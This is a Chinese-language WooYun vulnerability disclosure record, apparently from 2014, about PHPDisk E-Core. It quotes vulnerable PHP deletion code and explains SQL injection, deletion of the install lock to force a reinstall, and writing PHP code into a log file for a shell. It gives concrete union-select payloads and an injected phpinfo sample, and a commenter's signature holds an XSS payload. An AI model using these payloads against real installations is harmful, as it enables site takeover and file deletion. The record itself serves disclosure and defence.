{"id": 56455, "wybug_id": "wooyun-2014-057665", "wybug_title": "PHPDisk E-Core 漏洞 可注入 可重装 鸡肋可getshell", "wybug_corp": "phpdisk.com", "wybug_author": "′雨。", "wybug_date": "2014-04-19 10:58", "wybug_open_date": "2014-07-18 10:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-18：\t细节向公众公开  简要描述： 一系列的XXX。 详细说明：  http://bbs.phpdisk.com/thread-5143-1-1.html下载地址。 WooYun: phpdisk V7 sql注入2  WooYun: phpdisk V7 sql盲注一枚 话说之前提交的两个phpdisk的漏洞都被忽略 乌云君补个分可好。_________________________________________________________________________在phpdisk_del_process.php中\n$str = $_SERVER['QUERY_STRING'];if($str){\tparse_str(pd_encode($str,'DECODE'));\t$pp = iconv('utf-8','gbk',$pp);\t$arr = explode('.',$pp);\t$src_file = $arr[0].get_real_ext($arr[1]);\t$thumb_file = $arr[0].'_thumb.'.$arr[1];\t$out_txt = \"删除结果：【{$server_arr[$server]}】【{$_SERVER['HTTP_HOST']}】，删除文件【{$file_name}】，文件ID:[{$file_id}]\";\t$file_extension = get_extension($file_name);\t$esp = strlen($file_extension)+1;\tif($file_extension){\t\t$file_name = substr($file_name,0,strlen($file_name)-$esp);\t}\t$rs = $db->fetch_one_array(\"select file_real_name,file_extension,file_store_path from {$tpf}files where file_id='$file_id' limit 1\");\tif($rs){\t\t$num = @$db->result_first(\"select count(*) from {$tpf}files where file_real_name='{$rs[file_real_name]}' and file_extension='{$rs[file_extension]}' and file_name='{$file_name}' and file_store_path='{$rs[file_store_path]}'\");\t}\tif($safe){\t\tif($num==1){\t\t\tif(@unlink(PHPDISK_ROOT.$src_file)){\t\t\t\t@unlink(PHPDISK_ROOT.$thumb_file);\t\t\t\techo 'document.writeln(\"'.$out_txt.' <span class=\\\"txtblue\\\">成功</span><br>\");'.LF;\t\t\t}else{\t\t\t\techo 'document.writeln(\"'.$out_txt.' <span class=\\\"txtred\\\">失败[文件不存在或权限不足]</span><br>\");'.LF;\t\t\t\t//echo 'alert(\"'.$out_txt.' \\r\\n安全删除失败，请使用单个文件删除此文件后再使用批量删除功能1。\");'.LF;\t\t\t\t$log = '<? exit; ?> '.$out_txt.LF.'路径:'.PHPDISK_ROOT.$pp.' 时间:'.date('Y-m-d H:i:s').LF;\t\t\t\twrite_file(PHPDISK_ROOT.'system/delfile_log.php',$log,'ab');\t\t\t}\n全部问题都出在这代码中。\t$arr = explode('.',$pp);这里.用来分割。  0x01:注入\n$rs = $db->fetch_one_array(\"select file_real_name,file_extension,file_store_path from {$tpf}files where file_id='$file_id' limit 1\");\n看这里 直接把$file_id 带入查询。  但是之前未定义。 所以不会被转义。可控 造成了注入。但是这里没有输出的地方。 可以盲注 看看能否造成更大的伤害。0x02:重装系统\n$rs = $db->fetch_one_array(\"select file_real_name,file_extension,file_store_path from {$tpf}files where file_id='$file_id' limit 1\");\tif($rs){\t\t$num = @$db->result_first(\"select count(*) from {$tpf}files where file_real_name='{$rs[file_real_name]}' and file_extension='{$rs[file_extension]}' and file_name='{$file_name}' and file_store_path='{$rs[file_store_path]}'\");\t}\tif($safe){\t\tif($num==1){\t\t\tif(@unlink(PHPDISK_ROOT.$src_file)){\t\t\t\t@unlink(PHPDISK_ROOT.$thumb_file);\n这里 只要查询出来的数字为1 就直接删除这个文件\n$arr = explode('.',$pp);\t$src_file = $arr[0].get_real_ext($arr[1]);\n这里用了.来切割 所以不能利用../ 来向上跳目录 不过好在他删除的是PHPDISK_ROOT.$src_file  是从根目录开始的 所以就不用向上了。切割后 第一个就作为文件名 第二个就作为后缀 看看第二个进入的函数。\nfunction get_real_ext($file_extension){\tglobal $settings;\tif($file_extension){\t\t$exts = explode(',',$settings['filter_extension']);\t\tif(in_array($file_extension,$exts)){\t\t\t$file_ext = '.'.$file_extension.'.txt';\t\t}else{\t\t\t$file_ext = '.'.$file_extension;\t\t}\t}else{\t\t$file_ext = '.txt';\t}\treturn $file_ext;\n\n$settings['filter_extension'] = 'asp,asa,aspx,ascx,dtd,xsd,xsl,xslt,as,wml,java,vtm,vtml,jst,asr,php,php3,php4,php5,vb,vbs,jsf,jsp,pl,cgi,js,html,htm,xhtml,xml,css,shtm,cfm,cfml,shtml,bat,sh';\n检测到如果含有这些后缀的 就重新定义为txt。但是在这里面并没有lock。 所以我们可以来删除lock 然后重新装系统 再达到getshell。首先我们需要让$num为1\n$rs = $db->fetch_one_array(\"select file_real_name,file_extension,file_store_path from {$tpf}files where file_id='$file_id' limit 1\");\tif($rs){\t\t$num = @$db->result_first(\"select count(*) from {$tpf}files where file_real_name='{$rs[file_real_name]}' and file_extension='{$rs[file_extension]}' and file_name='{$file_name}' and file_store_path='{$rs[file_store_path]}'\");\t}\n在这里 如果$num要为1的话 需要数据库中存在这个文件才行。 所以得上传。但是如果这里我懒得去上传呢?  那就让$rs[file_real_name] 为a' union select 1#这样就不需要上传了。 \n\n\n265 Query\tselect file_real_name,file_extension,file_store_path from pd_files where file_id='a' union select 'a\\' and 1=2 union select 1#',2,3#' limit 1\t\t  265 Query\tselect count(*) from pd_files where file_real_name='a' and 1=2 union select 1#' and file_extension='2' and file_name='' and file_store_path='3'\n此时执行的语句如此。 \nmysql> select count(*) from pd_files where file_real_name='a' and 1=2 union select 1;#+----------+| count(*) |+----------+|        0 ||        1 |+----------+\n再limit 1,1 就能让num为1了。\n\n成功删除lock \n\n即可直接重装 可轻松getshell。0x03 鸡肋Getshell。继续看这个文件\nif($safe){\t\tif($num==1){\t\t\tif(@unlink(PHPDISK_ROOT.$src_file)){\t\t\t\t@unlink(PHPDISK_ROOT.$thumb_file);\t\t\t\techo 'document.writeln(\"'.$out_txt.' <span class=\\\"txtblue\\\">成功</span><br>\");'.LF;\t\t\t}else{\t\t\t\techo 'document.writeln(\"'.$out_txt.' <span class=\\\"txtred\\\">失败[文件不存在或权限不足]</span><br>\");'.LF;\t\t\t\t//echo 'alert(\"'.$out_txt.' \\r\\n安全删除失败，请使用单个文件删除此文件后再使用批量删除功能1。\");'.LF;\t\t\t\t$log = '<? exit; ?> '.$out_txt.LF.'路径:'.PHPDISK_ROOT.$pp.' 时间:'.date('Y-m-d H:i:s').LF;\t\t\t\twrite_file(PHPDISK_ROOT.'system/delfile_log.php',$log,'ab');\t\t\t}\n如果num 不为1  就不会删除文件了。 \nelse{\t\t\t\techo 'document.writeln(\"'.$out_txt.' <span class=\\\"txtred\\\">失败[文件不存在或权限不足]</span><br>\");'.LF;\t\t\t\t//echo 'alert(\"'.$out_txt.' \\r\\n安全删除失败，请使用单个文件删除此文件后再使用批量删除功能1。\");'.LF;\t\t\t\t$log = '<? exit; ?> '.$out_txt.LF.'路径:'.PHPDISK_ROOT.$pp.' 时间:'.date('Y-m-d H:i:s').LF;\t\t\t\twrite_file(PHPDISK_ROOT.'system/delfile_log.php',$log,'ab');\t\t\t}\n而是把这些信息写入个日志文件里, 而且这个日志文件还是php的文件。但是在开头定义了 <? exit; ?> 。 为什么说鸡肋呢 就是因为这个<? exit; ?>。  这里用的是<? 短标签 。  需要php.ini中开启short_tag 如果short_tag 为off的话 是不会执行这个exit的。虽然在安装phpdisk的时候会提示需要short_tag 为on 但是也不能排除一些用户在安装之后 关掉了这个。所以 当 short_tag 为off的时候 轻松getshell。\n\n配置文件中。\n<? exit; ?> 删除结果：【】【127.0.0.1】，删除文件【】，文件ID:[<?php phpinfo();?>#]路径:D:\\ApmServ\\www\\htdocs\\phpdiskecore\\system\\install.lock 时间:2014-04-18 22:08:56\n直接访问。\n\n   漏洞证明：  见详细说明。   修复方案：  addslashes<?php   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-04-23 13:09 厂商回复： 感谢反馈 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-19 11:38 |    \t\t好人 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:6        | 多少人曾爱慕你年轻的容颜)\t\t \n  今天星期六    \n     2014-04-19 17:35 |    \t\t走火入魔 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:2        | 多读书，多看报，少吃零食，多睡觉。)\t\t \n  今天星期六     \n     2014-04-20 11:12 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:24        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  今天星期六    \n     2014-06-14 10:52 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:37        | Talk is cheap.:)\t\t \n  我大概看了下，洞主这变量pp直接就提交了？你本地php.ini的register_globals开启了吧，而且该参数在PHP4.2.0后就关闭了，5.3.0废弃，5.4.0移除了的。利用条件应该比较苛刻？    \n     2014-06-14 11:00 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:188        | Only Code Never Lie To Me.)\t\t \n  @Ano_Tom   嗯 注入那个是需要全局。    \n     2014-06-14 11:04 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:37        | Talk is cheap.:)\t\t \n  @′  雨。 got it    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}